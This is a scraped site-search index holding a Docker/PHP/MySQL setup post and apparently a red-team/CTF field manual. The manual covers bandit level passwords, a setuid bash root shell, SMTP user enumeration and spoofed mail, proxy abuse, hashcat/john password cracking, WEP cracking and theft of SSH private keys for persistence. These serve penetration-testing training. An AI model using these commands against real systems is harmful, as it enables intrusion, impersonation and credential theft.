[{"title":"Spinning up Docker Infrastructure for Apache-Php-MySql","type":0,"sectionRef":"#","url":"blog/2020/06/26/docker","content":""},{"title":"Installation","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"Let's download and install the CE-edition of docker and docker-compose from the official docker website. "},{"title":"What we Got!!!","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"After fresh installation, we have $ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE hello-world latest fce289e99eb9 15 months ago 1.84kB $ docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES $ docker network ls NETWORK ID NAME DRIVER SCOPE efc1e1ca6409 bridge bridge local 34f81bd2e623 host host local 94d2f826785d none null local  "},{"title":"Dockerfile for php-apache","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"Let us create a Dockerfile for installation of php-apache. This Dockerfile will cater for pdo_mysql extensions. FROM php:7.4-apache RUN apt update && apt-get upgrade -y RUN docker-php-ext-install pdo_mysql EXPOSE 80  "},{"title":"Compose docker-compose.yml","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"Now lets, create docker-compose.yml file. Create three folders in the directory containing docker-compose.yml file. phpvol-dbvol-php Copy the Dockerfile we created previously into the php folder. vol-db and vpl-php will be used to map the database and php volumes. We will also create a database and user for MySql, database myapp_db; username devuser; and password devpass. So, our docker-compose.yml looks like: version: '3' services: db: image: mysql:latest container_name: app-db-mysql environment: MYSQL_ROOT_PASSWORD: tiger MYSQL_DATABASE: myapp_db MYSQL_USER: devuser MYSQL_PASSWORD: devpass volumes: - ./vol-db:/var/lib/mysql/ networks: - app-network web: build: context: ./php dockerfile: Dockerfile container_name: app-web-php74 depends_on: - db volumes: - ./vol-php:/var/www/html/ ports: - 5000:80 networks: - app-network phpmyadmin: image: phpmyadmin/phpmyadmin container_name: app-phpmyadmin depends_on: - db links: - db:db environment: MYSQL_ROOT_PASSWORD: tiger ports: - 5001:80 networks: - app-network networks: app-network:  "},{"title":"docker-compose up","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"cd into the directory containing docker-compose.yml file and the run docker-compose up command.  Now, lets check the sate of our docker containers and networks $ docker container ls --format \"{{.ID}}: {{.Names}}: {{.Ports}}\" 1f3cb046fe8c: app-web-php74: 0.0.0.0:5000->80/tcp c715238c051c: app-phpmyadmin: 0.0.0.0:5001->80/tcp b66a4f79e291: app-db-mysql: 3306/tcp, 33060/tcp $ docker network ls NETWORK ID NAME DRIVER SCOPE 5e9b89160c36 app-machine_app-network bridge local efc1e1ca6409 bridge bridge local a2e9779a2337 docker-files_server-network bridge local 34f81bd2e623 host host local 94d2f826785d none null local  $ docker network inspect app-machine_app-network ... \"Containers\": { \"1f3cb046fe8cd8a1c6581d8c582d1acc6854b6af5badf17f6ed395a4f4acd934\": { \"Name\": \"app-web-php74\", \"EndpointID\": \"4807260f315b9b97cec457e73c5eec78ad70170d0e7b4e34fd30c57448b96e8f\", \"MacAddress\": \"02:42:ac:19:00:04\", \"IPv4Address\": \"172.25.0.4/16\", \"IPv6Address\": \"\" }, \"b66a4f79e2911a56671a2c35543ac2d9bb2a4ef8826f2f426ba6a555ace46ff6\": { \"Name\": \"app-db-mysql\", \"EndpointID\": \"eff9246fa1ffd075ca5b7a66f2ab5a01177b7607a50b545a9814eda76b1e22e6\", \"MacAddress\": \"02:42:ac:19:00:02\", \"IPv4Address\": \"172.25.0.2/16\", \"IPv6Address\": \"\" }, \"c715238c051c85f3516d55e70079b3fe85bad7a43c6bc9cc64601b81f9650f62\": { \"Name\": \"app-phpmyadmin\", \"EndpointID\": \"3626814d31c4909c05a41f73bb7afb06fded070d217c9ece38cf297e31626850\", \"MacAddress\": \"02:42:ac:19:00:03\", \"IPv4Address\": \"172.25.0.3/16\", \"IPv6Address\": \"\" } }, ...  "},{"title":"Testing our Docker Infrastructure","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":""},{"title":"Peep inside my running php-apache instance","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"Let's see whats happening inside my running docker instance $ docker exec -it app-web-php74 bash  "},{"title":"Test apache-php","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"Let's create index.php file and place it in vol-php folder <?php // Show all information, defaults to INFO_ALL phpinfo(); ?>  In the browser, write localhost:5000 and we should get phpinfo page. Similarly, we can check phpmyadmin page by checking url localhost:5001. "},{"title":"Test connection with database","type":1,"pageTitle":"Spinning up Docker Infrastructure for Apache-Php-MySql","url":"blog/2020/06/26/docker#undefined","content":"create a file conn.php in vol-php folder <?php $servername = \"app-db-mysql\"; $username = \"devuser\"; $password = \"devpass\"; try { $conn = new PDO(\"mysql:host=$servername;dbname=myapp_db\", $username, $password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); echo \"Connected successfully\"; } catch(PDOException $e) { echo \"Connection failed: \" . $e->getMessage(); } ?>  Now, lets check the connection with database by running localhost:5000\\conn.php "},{"title":"MITRE","type":0,"sectionRef":"#","url":"docs/hunting/MITRE","content":""},{"title":"Custom Command and Control Protocol","type":1,"pageTitle":"MITRE","url":"docs/hunting/MITRE#undefined","content":"Custom Command and Control Protocol https://attack.mitre.org/techniques/T1094/ Merlin HTTP/2 C&C https://github.com/Ne0nd0g/merlin "},{"title":"bandit","type":0,"sectionRef":"#","url":"docs/hunting/bandit","content":""},{"title":"level 0","type":1,"pageTitle":"bandit","url":"docs/hunting/bandit#undefined","content":"$ ssh bandit0@bandit.labs.overthewire.org -p 2220  Check disk usage du -h /home/mandeep/test Output: 44K /home/mandeep/test/data 2.0M /home/mandeep/test/system design  "},{"title":"level 1","type":1,"pageTitle":"bandit","url":"docs/hunting/bandit#undefined","content":"How to open - filename This type of approach has a lot of misunderstanding because using - as an argument refers to STDIN/STDOUT i.e dev/stdin or dev/stdout.So if you want to open this type of file you have to specify the full location of the file such as ./- .For eg. , if you want to see what is in that file use cat ./- bandit1@bandit:~$ ls -la total 24 -rw-r----- 1 bandit2 bandit1 33 May 7 20:14 - drwxr-xr-x 2 root root 4096 May 7 20:14 . drwxr-xr-x 41 root root 4096 May 7 20:14 .. -rw-r--r-- 1 root root 220 May 15 2017 .bash_logout -rw-r--r-- 1 root root 3526 May 15 2017 .bashrc -rw-r--r-- 1 root root 675 May 15 2017 .profile bandit1@bandit:~$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9  "},{"title":"level 2","type":1,"pageTitle":"bandit","url":"docs/hunting/bandit#undefined","content":"spaces in the filename bandit2@bandit:~$ cat spaces\\ in\\ this\\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK  "},{"title":"level 3","type":1,"pageTitle":"bandit","url":"docs/hunting/bandit#undefined","content":"hidden files bandit3@bandit:~/inhere$ ls -la total 12 drwxr-xr-x 2 root root 4096 May 7 20:14 . drwxr-xr-x 3 root root 4096 May 7 20:14 .. -rw-r----- 1 bandit4 bandit3 33 May 7 20:14 .hidden bandit3@bandit:~/inhere$ cat .hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB  "},{"title":"level 4","type":1,"pageTitle":"bandit","url":"docs/hunting/bandit#undefined","content":"human readable bandit4@bandit:~/inhere$ file ./* ./-file00: data ./-file01: data ./-file02: data ./-file03: data ./-file04: data ./-file05: data ./-file06: data ./-file07: ASCII text ./-file08: data ./-file09: data bandit4@bandit:~/inhere$ cat ./-file07 koReBOKuIDDepwhWk7jZC0RTdopnAYKh  "},{"title":"Red Hunters Field Manual","type":0,"sectionRef":"#","url":"docs/hunting/field-manual","content":"This field manual is to serve as a practitioners guide for Red Teaming. Limited explanations are given."},{"title":"ForensicsForensics","type":0,"sectionRef":"#","url":"docs/hunting/forensics","content":""},{"title":"Basic Commands","type":1,"pageTitle":"ForensicsForensics","url":"docs/hunting/forensics#undefined","content":"# check the format type for the given image. img_stat evidence.img # check the file system type and the last mounted directory of the given image. fsstat evidence.img # list all the directories on the root directory of the disk image. fls evidence.img # extract the file flag.txt from the disk image file. # Here 16 is the inode number of the file flag.txt on the image, # which can be obtained from the fls command above. icat evidence.img 16  "},{"title":"linux_deb_backdoor","type":0,"sectionRef":"#","url":"docs/hunting/linux_deb_backdoor","content":"Refs:https://fabianlee.org/2018/09/28/ubuntu-customizing-and-repacking-a-deb-file/"},{"title":"Linux Privilege Escalation","type":0,"sectionRef":"#","url":"docs/hunting/linux_priv_esc","content":""},{"title":"SETUID","type":1,"pageTitle":"Linux Privilege Escalation","url":"docs/hunting/linux_priv_esc#undefined","content":""},{"title":"bash -p","type":1,"pageTitle":"Linux Privilege Escalation","url":"docs/hunting/linux_priv_esc#undefined","content":"The payload upon execution sets the setuid bit on /bin/bash binary. We can check the same as follows  $ ls -l /bin/bash -rwsr-sr-x 1 root root 1099016 May 15 2017 /bin/bash  If a setuid bit is set on a binary, the binary can be executed with the effective user id of the user who owns the binary. In this case the setuid/setgid bit is set on bash which is owned by root. By default, if the effective user id and the real user id are not equal, bash will set the effective user id to the real user id. In this case, the bash process will be started with the user user. In order, to prevent the effective user id from resetting to the real user id, the -p option has to be passed. Upon running the command bash -p, the bash binary will run with effective user id 0, providing a root shell. $ bash -p bash-4.4# id uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user) bash-4.4# whoami root  "},{"title":"SMTPSMTP","type":0,"sectionRef":"#","url":"docs/hunting/network_recon/SMTP","content":""},{"title":"grab banner","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":""},{"title":"enumerating username","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":""},{"title":"send mail","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":""},{"title":"nmap","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nmap.md#banner "},{"title":"nc","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nc.md#banner-grabbing "},{"title":"using commands","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":"Refs https://blog.mailtrap.io/smtp-commands-and-responses/ Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. VRFY netcat 192.91.109.3 25 HELP HELO abc VRFY admin@victim-1  EXPN netcat 192.91.109.3 25 HELP HELO abc EXPN admin@victim-1 250 2.1.5 <admin@victim-1>  RCPT TO netcat 192.91.109.3 25 HELP HELO abc MAIL FROM:a@victim-1 250 2.1.0 a@victim-1... Sender ok RCPT TO:admin@victim-1 250 2.1.5 admin@victim-1... Recipient ok (will queue)  "},{"title":"smtp-user-enum","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":"Refs : https://tools.kali.org/information-gathering/smtp-user-enumhttp://pentestmonkey.net/tools/user-enumeration/smtp-user-enum # Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets ) smtp-user-enum -U usernames.txt -t 192.186.235.3  "},{"title":"metasploit smtp_enum","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":"msfconsole \\ use auxiliary/scanner/smtp/smtp_enum \\ set RHOSTS 192.186.235.3 \\ exploit send mailusing telnettelnet 192.186.235.3 25 HELO attacker.xyz MAIL FROM: admin@attacker.xyz RCPT TO: root@victim-1 DATA Subject: Hi Root Hello, This is a fake mail sent using telnet command. From, Admin . Note: There is a dot(.) in the last line which indicates the termination of data.using sendemail$ sendemail -f admin@attacker.xyz -t root@victim-1 -s 192.91.109.3 -u Fakemail -m \"Hi root, a fake from admin\" -o tls=no May 15 09:21:55 attackdefense sendemail[110]: Email was sent successfully!  "},{"title":"using telnet","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":"telnet 192.186.235.3 25 HELO attacker.xyz MAIL FROM: admin@attacker.xyz RCPT TO: root@victim-1 DATA Subject: Hi Root Hello, This is a fake mail sent using telnet command. From, Admin .  Note: There is a dot(.) in the last line which indicates the termination of data. "},{"title":"using sendemail","type":1,"pageTitle":"SMTPSMTP","url":"docs/hunting/network_recon/SMTP#undefined","content":"$ sendemail -f admin@attacker.xyz -t root@victim-1 -s 192.91.109.3 -u Fakemail -m \"Hi root, a fake from admin\" -o tls=no May 15 09:21:55 attackdefense sendemail[110]: Email was sent successfully!  "},{"title":"ProxyProxy","type":0,"sectionRef":"#","url":"docs/hunting/network_recon/proxy","content":""},{"title":"Proxy Authentication","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":""},{"title":"Proxychains","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":"Proxychains is a tool which forces the TCP connection to go through the configured proxy(s). Proxychians can force the connection through multiple proxy servers. For e.g, if you have the following proxychains configuration (with strict chain option): socks5 192.200.34.4socks5 192.200.33.5socks4 192.200.32.6 The TCP connection will be sent through proxy servers in the following order. Host <---> 192.200.34.4 <--->192.200.33.5 <---> 192.200.32.6 <---> Target If any of the proxy servers fails to connect, the TCP connection won't be established. To skip a dead proxy server and move on to the next proxy server Dynamic chain option is used. The random chain option is used to randomly select the order of the proxy server for forwarding the TCP connection. Upon starting a program, for e.g Mozilla Firefox with the command: proxychains firefox, All the TCP traffic of Mozilla Firefox will be forced through the proxy server. "},{"title":"Open Authentication","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":"If the proxy is configured with authentication, any attempts made via proxy will return an access denied error. In case the proxy is configured without authentication, the connection will be forwarded by the proxy and the error message will be different than Access denied error. By using the command curl -x 192.201.208.3:3128 127.0.0.1. We are looking for a different error message than Access Denied. Provided the proxy does not use any authentication, in case if a service is running, (for e.g an apache server) an HTTP response will be received, if no service is running then the connection refused error will be received. Either of the error will confirm that the proxy is configured without authentication. The following example shows that squid proxy is configured without authentication. $ curl -i -x 192.234.192.3:3128 127.0.0.1 HTTP/1.1 503 Service Unavailable Server: squid/3.5.12 ... X-Squid-Error: ERR_CONNECT_FAIL 111 Vary: Accept-Language Content-Language: en X-Cache: MISS from victim-1 X-Cache-Lookup: MISS from victim-1:3128 Via: 1.1 victim-1 (squid/3.5.12) Connection: keep-alive <!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"> <html><head> <meta type=\"copyright\" content=\"Copyright (C) 1996-2015 The Squid Software Foundation and contributors\"> <meta http-equiv=\"Content-Type\" CONTENT=\"text/html; charset=utf-8\"> <title>ERROR: The requested URL could not be retrieved</title> <style type=\"text/css\"><!-- ... . <blockquote id=\"error\"> <p><b>Connection to 127.0.0.1 failed.</b></p> </blockquote> ...  "},{"title":"username and password","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/curl.md#username-and-password-for-proxy "},{"title":"bruteforce","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":"nmap https://github.com/jai-the-seeker/CTF-OSCP/blob/master/utilities/nmap.md#http-proxy-brute bash script https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts/bash_scripts.md#proxy-authentication-dictionary-attk "},{"title":"Configure proxychain","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":"cat /etc/proxychains.conf # Add details of http proxy at the end of the file http 192.234.192.3 3128  "},{"title":"Proxychain with nmap","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":"We can use proxychain, to scan the target machine, we are forcing the traffic of nmap to go through the HTTP Proxy server. Since, we have configured http proxy, we need to use -sT flag with nmap. proxychains nmap -sV -sT -p- 127.0.0.1  Please note: nmap also has an --proxies option. But it is not used as it does not work as expected, On the Nmap documentation (https://nmap.org/book/man-bypass-firewalls-ids.html), it is mentioned that the feature is till under development and has limitations. "},{"title":"Proxychain with curl","type":1,"pageTitle":"ProxyProxy","url":"docs/hunting/network_recon/proxy#undefined","content":"curl -x 192.201.208.3:3128 127.0.0.1:1337 # The above command is same as proxychains curl 127.0.0.1:1337  "},{"title":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","type":0,"sectionRef":"#","url":"docs/hunting/password_cracking","content":""},{"title":"findmyhash","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"https://tools.kali.org/password-attacks/findmyhash Specifying the hash algorithm MD5, attempt to crack the given hash -h 098f6bcd4621d373cade4e832627b4f6: root@kali:~# findmyhash MD5 -h 098f6bcd4621d373cade4e832627b4f6  Hashcat "},{"title":"example hashes","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"https://hashcat.net/wiki/doku.php?id=example_hashes "},{"title":"show delete found password","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"To show an existing cracked password use --show flag in the end like hashcat -m 0 -a 0 digest.txt /usr/share/wordlists/rockyou.txt --force --show  You can disable potfile support completely by using --potfile-disable # find hashcat.potfile find / -type f -name 'hashcat.potfile' # -n tells echo not to output the trailing newline echo -n \"\" > /hashcat/hashcat-4.2.1/hashcat.potfile  "},{"title":"Mask Based Attack","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":""},{"title":"Dictionary Attack","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"Refs: https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/ hashcat -m 1800 -a 0 hash.lst wordlist.txt  -m 1800 designates the type of hash we are cracking (SHA-512) -a 0 designates a dictionary attack hash.lst is our input file of hashes wordlist.txt is the absolute path to our wordlist for this dictionary attack "},{"title":"MD5","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"Any hash with 32 characters is MD5 echo -n 8743b52063cd84097a65d1633f5c74f5 | wc -c 32  # -m 0 : MD5 without salt # MD5 hash:salt # cf0b18ddb1a31d05fc73f50fcd29e0a8:salt123 hashcat -m 10 -a 0 digest.txt password-seclists.txt  "},{"title":"HMAC","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"HMAC is a keyed hash (authenticated hash) scheme which ensures that a specific hash value can only be generated if the entity possess a secret key. This scheme can be used to turn any existing hash function into an authenticated hash function which can be then used to check the authenticity of the message in addition to its integrity. HMAC-SHA1 was widely used in online banking security, HTTPS, VPN connections in addition to verify the integrity of the files/binaries. In essence, it is mostly used to protect the data in transit over insecure mediums.  A plain-text string and corresponding HMAC-SHA1 digest is provided in digest.txt file. The key used to generate the HMAC-SHA1 is either taken from a key dictionary or by using the key policy. The digest.txt file and the dictionary file password-seclists.txt is present in the user's home directory. Objective: Recover the secret key. 150\tHMAC-SHA1 (key = $pass)\tc898896f3f70f61bc3fb19bef222aa860e5ea717:1234 from example hashes # # hash:plaintext # 69f7e54d484620ed6e9d731ca51780a000463fc2:tinkerbell97 hashcat -m 150 -a 0 digest.txt password-seclists.txt  "},{"title":"CRC32","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"11500\tCRC32 5\tc762de4a:00000000 from example hashes hashcat -m 11500 -a 0 digest.txt password-seclists.txt  "},{"title":"SHA1","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"hashcat -m 100 digest.txt -a 0 password-seclists.txt  "},{"title":"NTLM","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"hashcat -m 1000 -a 0 digest.txt password-seclists.txt  "},{"title":"MD5Crypt","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"hashcat -m 500 digest.txt -a 0 1000000-password-seclists.txt  "},{"title":"Bcrypt","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"Bcrypt is a popular 184-bit password hashing function designed by Niels Provos and David Mazières in 1999. It is based on blowfish cipher. It is default password hashing algorithm for OpenBSD and other OSes like SUSE Linux. $ cat digest.txt Digest: gLX3.eb.sPNURq3Y87bx/eUC9Ysw6mZhi1HAWvy07DWYyw9zYI3.W Rounds: 4  This input format is not compatible to Hashcat. So, modify it $ cat digest.txt $2a$04$gLX3.eb.sPNURq3Y87bx/eUC9Ysw6mZhi1HAWvy07DWYyw9zYI3.W hashcat -m 3200 -a 0 digest.txt password-seclists.txt  Wordlists "},{"title":"Generate a custom wordlist","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper. Refer : https://tools.kali.org/password-attacks/cewl cewl -w createWordlist.txt -m <min password length> https://www.example.com  Scan to a depth of 2 -d 2 and use a minimum word length of 5 -m 5, save the words to a file -w docswords.txt, targeting the given URL (https://example.com): cewl -d 2 -m 5 -w docswords.txt https://example.com  john the ripper John HASH cracking using dictionary john --wordlist=/user/share/wordlists/rockyou.txt hash.txt  MD5 $ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt SHA1 $ john --format=raw-sha1 hashes.txt SHA224 $ john --format=raw-sha224 hashes.txt SHA512 $ john --format=raw-sha512 hashes.txt  Other hash formats supported by John the Ripper: http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats "},{"title":"john pot file","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":""},{"title":"RAR","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"# extract hashes of .rar file rar2john archive.rar > hash cat hash $rar5$16$50d889a2c6441510dd0c8ab76dde4fd6$15$697757daca178f6f88135491827bdad6$8$e13f0c4d2f8286d5 john --wordlist=password-seclists.txt hash hashcat -m 13000 hash -a 0 password-seclists.txt  "},{"title":"PKZIP","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"We have to use JTR because at the time of writing this document, PKZIP is not supported by hashcat # extract hashes of .zip file zip2john archive.zip > hash cat hash archive.zip:$pkzip2$1*2*2*0*2d*21*c10509e*0*3f*0*2d*0c10*360a*f5e92c2b27b0f6ece97e6030ccb3338eb42b7c5ec117f4b49bfb0232e1e45e1673c6ef2fb8c952ba2410a770aa*$/pkzip2$:::::archive.zip john --wordlist=1000000-password-seclists.txt hash  "},{"title":"MS word .docx","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"MS Office 2013 # extract hashes of .docx file office2john MS_Word_Document.docx > hash $ cat hash MS_Word_Document.docx:$office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2 john --wordlist=password-seclists.txt hash  Using Hashcat # Make the hashes compatible with hashcat cat hash $office$*2013*100000*256*16*ff2563844faca58a12fc42c5036f9cf8*ffaf52db903dbcb6ac2db4bab6d343ab*c237403ec97e5f68b7be3324a8633c9ff95e0bb44b1efcf798c70271a54336a2 hashcat -m 9600 hash -a 0 password-seclists.txt  "},{"title":"MS word .doc","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"MS Office 1997-2003 office2john MS_Word_Document_97_2003.doc > hash $ cat hash MS_Word_Document_97_2003.doc:$oldoffice$4*f1efb1c529cff63cb08cf439df074c5d*9256d6abe8325534e7dae97f9f5967d9*8f015d410f45812c5e554ab7a147f1d9285ff6ea:::::MS_Word_Document_97_2003.doc john --wordlist=password-seclists.txt hash  Using Hashcat # Make the hashes compatible with hashcat cat hash $oldoffice$4*f1efb1c529cff63cb08cf439df074c5d*9256d6abe8325534e7dae97f9f5967d9*8f015d410f45812c5e554ab7a147f1d9285ff6ea hashcat -m 9800 hash -a 0 password-seclists.txt  WiFi "},{"title":"WEP","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"# -b <bssid> : target selection: access point's MAC aircrack-ng -b 00:21:91:d2:8e:25 WEP-Cracking.cap  "},{"title":"Setup Mask","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"Refs https://hashcat.net/wiki/doku.php?id=mask_attackhttps://www.4armed.com/blog/perform-mask-attack-hashcat/ command: -a 3 -1 ?l?d ?1?1?1?1?1 keyspace: aaaaa - 99999  # password length is 5 characters # password can only contain characters from this character set: a-z, 0-9 hashcat -m 0 -a 3 digest.txt -1 ?l?d ?1?1?1?1?1  "},{"title":"Increment Mode","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"# If you take the mask “?l?l?l?l?l?l?l” it will only try passwords of that length. To cycle through all the possible combinations from # one to seven, the “--increment argument” can be used. ?l ?l?l ?l?l?l ?l?l?l?l ?l?l?l?l?l ?l?l?l?l?l?l?l  In order to limit the increment within a specified range use --increment-min and increment-max options "},{"title":"Hashcat Mask Files","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"Let us consider the following scenario for creating a password masking attack: Length between five and eight charactersAlways starts with a capital letterAlways ends with a numberThe characters in the middle are either lower or upper case For a single entry in a mask file, the following structure is used: charset1,charset2,charset3,charset4,mask  It's important to highlight that the charset parameters are optional. So it's possible to create entries in the following format: charset1,charset2,charset3,charset4,mask charset1,charset2,mask mask  To meet the previous scenario, we can create a mask file containing the following: ?u,?u?l,?d,?1?2?2?2?3 ?u,?u?l,?d,?1?2?2?2?2?3 ?u,?u?l,?d,?1?2?2?2?2?2?3  Mask files have the file extension of .hcmask and can be used from the command line like below: hashcat -m 0 -a 3 hash masks.hcmask  "},{"title":"How to clear crakced hash from database","type":1,"pageTitle":"Password Crackinghash-identifierhash online websitesHashcatWordlistsjohn the ripperProtected FilesWiFi","url":"docs/hunting/password_cracking#undefined","content":"As you can see in the docs http://www.openwall.com/john/doc/, John (and almost any good hash cracker) will store the cracked hashes in some sort of file/db. This is for performance, this programs will check for already cracked hashes preventing them to spend cpu/gpu time. In the case of John, is located at: $JOHN/john.pot ($JOHN path depends on the install). You can view the previously cracked hashes in the terminal with the command: john --show passwd Protected Files "},{"title":"persistence","type":0,"sectionRef":"#","url":"docs/hunting/persistence","content":""},{"title":"Theft of SSH private keys","type":1,"pageTitle":"persistence","url":"docs/hunting/persistence#undefined","content":"Stealing SSH private key is a widely used method to maintain access even after the user changes his password.  This is also covered by the MITRE ATT&CK framework: https://attack.mitre.org/techniques/T1145/ # Copy the private keys of the user from the server, if they are kept as backup $ scp student@192.224.16.3:~/.ssh/id_rsa . # Once you have access to private keys of the user, you can login without password # Change the permissions of the private key id_rsa to 400. # It is required that your private key files are NOT accessible by others. $ chmod 400 id_rsa $ ssh -i id_rsa student@192.224.16.3  Example of private SSH keys lying in the computer Example case I: A development server that compiles, pulls/pushes code from a central code repository, and deploys the application/software on a test server might have private keys of deployment server and code server (to automate things and avoid credentials every time). Example case II: For automation, a lot of tools like Ansible, use SSH-based connections to multiple target machines, and perform a set of pre-defined actions. In this case, the machine hosting the Ansible will have the private keys. "},{"title":"Bash ScriptsBashUseful ScriptsSystem CommandsBasic Bash Commands and Constructs","type":0,"sectionRef":"#","url":"docs/hunting/scripts/bash_scripts","content":""},{"title":"Sed","type":1,"pageTitle":"Bash 